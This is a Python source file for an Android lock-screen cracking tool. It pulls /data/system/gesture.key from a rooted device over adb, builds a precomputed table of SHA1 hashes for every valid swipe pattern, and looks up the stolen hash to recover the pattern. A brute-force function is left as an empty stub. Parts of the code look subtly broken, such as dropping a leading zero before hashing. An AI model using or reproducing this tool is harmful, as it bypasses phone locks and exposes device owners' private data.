"""
     ___________________
    |                   |
    | 0      1        2 |
    |                   | 
    | 3      4        5 |
    |                   |
    | 6      7        8 |
    |___________________|

    THE TUPLES
    6-> (0,0)
    7-> (0,1)
    8-> (0,2)
    3-> (1,0)
    4-> (1,1)
    5-> (1,2)
    0-> (2,0)
    1-> (2,1)
    2-> (2,2)
"""
import binascii
import hashlib
import hmac
import os
import subprocess
from itertools import permutations

def generate_combinations(points):
    """
    Generate all possible combinations of the provided list of points.
    The list of points should be a list of lists.
    Each sublist should contain a list of numbers.
    """
    combinations = []
    
    #Remove redundant numbers in the list of points
    points_set = list(set(points))

    # Recursive helper function to generate combinations
    def generate_helper(current_combination, remaining_numbers):
        if not remaining_numbers:
            # If no more numbers are left, add the current combination to the list
            combinations.append(current_combination)
            return

        # Iterate through each number in the remaining numbers
        for i in range(len(remaining_numbers)):
            # Remove the current number from the remaining numbers
            next_number = remaining_numbers[i]
            remaining = remaining_numbers[:i] + remaining_numbers[i+1:]

            # Recursively call the helper function with the updated combination and remaining numbers
            generate_helper(current_combination + [next_number], remaining)

    # Start the generation process with an empty combination and all numbers
    generate_helper([], points_set)

    # Return the list of combinations
    return combinations

def tuple_to_number(tuples):
    """
    Converts a cells tuple id to a number 
    """
    conversion_table = {
        (0, 0): 7,
        (0, 1): 8,
        (0, 2): 9,
        (1, 0): 4,
        (1, 1): 5,
        (1, 2): 6,
        (2, 0): 1,
        (2, 1): 2,
        (2, 2): 3
    }
    return conversion_table[tuples]


def convert_to_tuple(numbers):
    """
    Converts a list of lists of numbers to tuple to be used to visualize the patterns
    """

    # Define the conversion table as a dictionary
    conversion_table = {
        7: (0, 0),
        8: (0, 1),
        9: (0, 2),
        4: (1, 0),
        5: (1, 1),
        6: (1, 2),
        1: (2, 0),
        2: (2, 1),
        3: (2, 2)
    }

    tuples = []

    for sublist in numbers:
        converted_sublist = []
        for number in sublist:
            if number in conversion_table:
                converted_sublist.append(conversion_table[number])
            else:
                raise ValueError(
                    f"Invalid number {number}. The number should be between 1 and 9.")
        tuples.append(converted_sublist)
    return tuples


def remove_invalid_combinations(combinations):
    """
    Removes invalid combinatons from the list of combinations
    This will ensure that generated patterns are valid
    A line shouuld not cross over a non selected point

    When two extreme points are selected, then a middle point must appear between them eg 7-4-1 not 7-1-2 or before them
    EXTREME POINTS 
    1---3--->2
    4---6--->5
    7---9--->8

    1---7--->4
    2---8--->5
    3---9--->6

    7---3--->5
    1---9--->5

    """
    valid_combinations = []
    def check_previous(n, x, comb):
        """Checks if the middle point exists before the current point 
            Args:
                n (int): the current index
                x (int): the middle point to check
                comb (int): the current combination to check against
        """
        return x in comb[:n+1]

    # Mapping the extreme points to their middle points
    mapping = {
        (1, 3): 2,
        (3, 1): 2,
        (4, 6): 5,
        (6, 4): 5,
        (7, 9): 8,
        (9, 7): 8,
        (7, 1): 4,
        (1, 7): 4,
        (2, 8): 5,
        (8, 2): 5,
        (3, 9): 6,
        (9, 3): 6,
        (7, 3): 5,
        (3, 7): 5,
        (1, 9): 5,
        (9, 1): 5
    }

    for comb in combinations:
        # Checking if comb is valid
        valid = True
        for n in range(0, len(comb) - 1):
            if mapping.get((comb[n], comb[n+1])):
                if check_previous(n, mapping[(comb[n], comb[n+1])], comb):
                    valid = True
                else:
                    valid = False
                    break
            valid = True
        if valid:
            valid_combinations.append(comb)

    return valid_combinations

def check_adb_connection():
    try:
        # Use the 'adb devices' command to list connected devices
        result = subprocess.run(["adb", "devices"], capture_output=True, text=True, check=True)
        output = result.stdout

        # Split the output into lines and check for connected devices
        lines = output.strip().split('\n')[1:]
        devices = [line.split('\t')[0] for line in lines if line.strip() != '']

        if devices:
            print("Connected devices:")
            for device in devices:
                print(device)
            return True
        else:
            print("No devices are connected via USB.")
            return False
    except subprocess.CalledProcessError as e:
        error_output = e.stderr
        print("An error occurred while checking ADB connection:", error_output)
        return False


def grab_gesture_key():
    """
        Grab gesture.key from /data/system  -- Rooted devices only :)

    """
    if check_adb_connection():
        try:
            result = subprocess.run(["adb", "pull", "/data/system/gesture.key"], capture_output=True, text=True, check=True)
            print("gesture.key file has been successfully pulled from the device.")
        except subprocess.CalledProcessError as e:
            error_output = e.stderr
            if "remote object '/data/system/gesture.key' does not exist" in error_output.lower():
                print("The 'gesture.key' file does not exist on the device.")
            else:
                print("An error occurred while pulling the 'gesture.key' file:", error_output)
                print("Make sure your device is rooted to access this file.")

def mapPermutation(perm):
    """
        Does the following mapping
             ___________________             _________________
            |                   |           |                 |
            | 0      1        2 |           | 9     8       7 |
            |                   |           |                 |
            | 3      4        5 | =====>    | 6     5       4 |      
            |                   |           |                 |
            | 6      7        8 |           | 3     2       1 |
            |___________________|           |_________________|

    """
    comb = list(perm)
    # Conversion table
    conversion_table = {
        0: 9,
        1: 8,
        2: 7,
        3: 6,
        4: 5,
        5: 4,
        6: 3,
        7: 2,
        8: 1
    }

    conversion_dict = {int(key): int(value) for key, value in conversion_table.items()}
    mappedPerm = [conversion_dict.get(int(num), int(num)) for num in comb]
    x=[]
    y = [int(x)for x in mappedPerm]
    x.append(y)
    return remove_invalid_combinations(x)
    
 

def hashPattern(pattern):
    """
        Create a hash representation of a pattern using SHA1 which is used by most android devices
        
    """
    pattern = ''.join(str(c) for c in pattern)
    pattern_hex = binascii.unhexlify(''.join('%02x' % (ord(c) - ord('0')) for c in pattern))
    hashedpattern = hashlib.sha1(pattern_hex).hexdigest()
    return hashedpattern


def createPatternsHashFile():
    """
        Will create a file containing all possible patterns combinations and their corresponding hashes
        FILE FORMAT:> sequence:hash
    """
    try: 
        if os.path.isfile("patternHashes"):
            return
        numbers = list(range(9)) #List of numbers from 0 to 8
        c = 0
        with open ('patternHashes', 'w') as file:
            for n in range(5,10):
                for perm in permutations(numbers, n):
                    # Verify if the permutation is a valid combination
                    if len(mapPermutation(perm)) != 0:
                        sequence = str(int(''.join(map(str,perm))))
                        file.write(sequence+":"+hashPattern(sequence)+"\n")

    except Exception as e:
        print("An error occurred: ", str(e))
                

def searchHash(target_hash):
    """
        First obtain the corresponding pattern sequence from the rainbow tables of all hash sequences
        Returns a pattern sequence
    """
    pattern_hash_dict = {}
    try:
        with open("patternHashes", 'r') as file:
            for line in file:
                sequence, hash_value = line.strip().split(':')
                pattern_hash_dict[hash_value] = sequence
    except FileNotFoundError:
        raise Exception("File not found")
    except Exception as e:
        raise Exception(f"An error occurred: {e}")
        

    return pattern_hash_dict.get(target_hash, None)


    
def compareHash(hash1: str, hash2:str) -> bool:
    """
    Compares two given hashes
    Returns true if they match false otherwise
    """
    if hash1 is None or hash2 is None or not isinstance(hash1, str) or not isinstance(hash2, str):
        return False

    return hmac.compare_digest(hash1, hash2)

def startBruteforce():
    """
        Start injecting the pattern in the target android device
    """
